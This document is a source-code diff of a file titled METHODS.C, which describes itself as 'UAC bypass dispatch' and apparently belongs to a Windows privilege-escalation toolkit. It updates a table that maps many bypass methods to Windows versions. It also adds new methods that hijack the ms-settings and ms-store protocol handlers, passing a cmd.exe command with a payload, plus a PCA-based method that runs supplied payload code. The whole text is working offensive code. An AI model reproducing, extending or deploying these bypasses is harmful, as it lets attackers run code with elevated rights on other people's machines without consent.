@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2015 - 2020
+*  (C) COPYRIGHT AUTHORS, 2015 - 2021
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.53
+*  VERSION:     3.56
 *
-*  DATE:        07 Nov 2020
+*  DATE:        16 July 2021
 *
 *  UAC bypass dispatch.
 *
@@ -43,6 +43,8 @@ UCM_API(MethodDeprecated);
 UCM_API(MethodIeAddOnInstall);
 UCM_API(MethodWscActionProtocol);
 UCM_API(MethodFwCplLua2);
+UCM_API(MethodProtocolHijack);
+UCM_API(MethodPca);
 
 ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodWow64Logger,
@@ -50,77 +52,83 @@ ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodNICPoison,
     UacMethodIeAddOnInstall,
     UacMethodWscActionProtocol,
-    UacMethodFwCplLua2
+    UacMethodFwCplLua2,
+    UacMethodMsSettingsProtocol,
+    UacMethodMsStoreProtocol,
+    UacMethodPca
 };
 
 UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
-    { MethodTest, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodSXS, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodDism, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodWow64Logger, { 7600, MAXDWORD }, AKATSUKI_ID, FALSE, TRUE, TRUE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodUiAccess, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodMsSettings, { 10240, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodTyranid, { 9600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodJunction, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodSXSDccw, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodHakril, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, FALSE, TRUE },
-    { MethodCorProfiler, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodCMLuaUtil, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDccwCOM, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, TRUE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDirectoryMock, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodShellSdctl, { 14393, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodTokenModUIAccess, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, FALSE },
-    { MethodShellWSReset, { 17134, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodEditionUpgradeManager, { 14393, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodDebugObject, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodShellChangePk, { 14393, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodMsSettings, { 17134, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodNICPoison, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodIeAddOnInstall, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodWscActionProtocol, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
-    { MethodFwCplLua2, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE }
+    { MethodTest, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodSXS, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodDism, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodWow64Logger, { NT_WIN7_RTM, MAXDWORD }, AKATSUKI_ID, FALSE, TRUE, TRUE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodUiAccess, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodMsSettings, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodTyranid, { NT_WIN8_BLUE, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodJunction, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodSXSDccw, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodHakril, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, FALSE, TRUE },
+    { MethodCorProfiler, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodCMLuaUtil, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDccwCOM, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, TRUE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDirectoryMock, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodShellSdctl, { NT_WIN10_REDSTONE1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodTokenModUIAccess, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, FALSE },
+    { MethodShellWSReset, { NT_WIN10_REDSTONE4, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodEditionUpgradeManager, { NT_WIN10_REDSTONE1, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodDebugObject, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodDeprecated, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodShellChangePk, { NT_WIN10_REDSTONE1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodMsSettings, { NT_WIN10_REDSTONE4, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodNICPoison, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodIeAddOnInstall, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodWscActionProtocol, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
+    { MethodFwCplLua2, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
+    { MethodProtocolHijack, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
+    { MethodProtocolHijack, { NT_WIN10_REDSTONE5, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
+    { MethodPca, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
 };
 
 /*
@@ -281,7 +289,10 @@ NTSTATUS MethodsManagerCall(
     }
 #endif //_WIN64
 
+#pragma warning(push)
+#pragma warning(disable:33010) //BS disable.
     Entry = &ucmMethodsDispatchTable[Method];
+#pragma warning(pop)
 
     Status = IsMethodMatchRequirements(Entry);
     if (!NT_SUCCESS(Status))
@@ -540,7 +551,7 @@ UCM_API(MethodTokenModUIAccess)
 
 UCM_API(MethodShellWSReset)
 {
-    ULONG Result = 0;
+    NTSTATUS Result = STATUS_ACCESS_DENIED;
     LPWSTR PayloadParameter = NULL, PayloadFinal = NULL;
     SIZE_T Size;
 
@@ -671,4 +682,58 @@ UCM_API(MethodFwCplLua2)
         lpszPayload = g_ctx->szOptionalParameter;
 
     return ucmFwCplLuaMethod2(lpszPayload);
+}
+
+UCM_API(MethodProtocolHijack)
+{
+    NTSTATUS Result = STATUS_ACCESS_DENIED;
+    LPWSTR PayloadParameter = NULL, PayloadFinal = NULL;
+    SIZE_T Size;
+
+    //
+    // Select target application or use given by optional parameter.
+    //
+    if (g_ctx->OptionalParameterLength == 0)
+        PayloadParameter = g_ctx->szDefaultPayload;
+    else
+        PayloadParameter = g_ctx->szOptionalParameter;
+
+    switch (Parameter->Method) {
+    
+    case UacMethodMsSettingsProtocol:
+        Result = ucmMsSettingsProtocolMethod(PayloadParameter);
+        break;
+    
+    case UacMethodMsStoreProtocol:
+
+        Size = ((MAX_PATH * 2) + _strlen(PayloadParameter)) * sizeof(WCHAR);
+        PayloadFinal = supHeapAlloc(Size);
+        if (PayloadFinal) {
+
+            _strcpy(PayloadFinal, g_ctx->szSystemDirectory);
+            _strcat(PayloadFinal, CMD_EXE);
+            _strcat(PayloadFinal, RUN_CMD_COMMAND);
+            _strcat(PayloadFinal, PayloadParameter);
+            Result = ucmMsStoreProtocolMethod(PayloadFinal);
+            supHeapFree(PayloadFinal);
+        }
+        break;
+
+    default:
+        break;
+    }
+
+    return Result;
+}
+
+UCM_API(MethodPca)
+{
+#ifndef _WIN64
+    UNREFERENCED_PARAMETER(Parameter);
+    return STATUS_NOT_SUPPORTED;
+#else
+    return ucmPcaMethod(
+        Parameter->PayloadCode,
+        Parameter->PayloadSize);
+#endif
 }
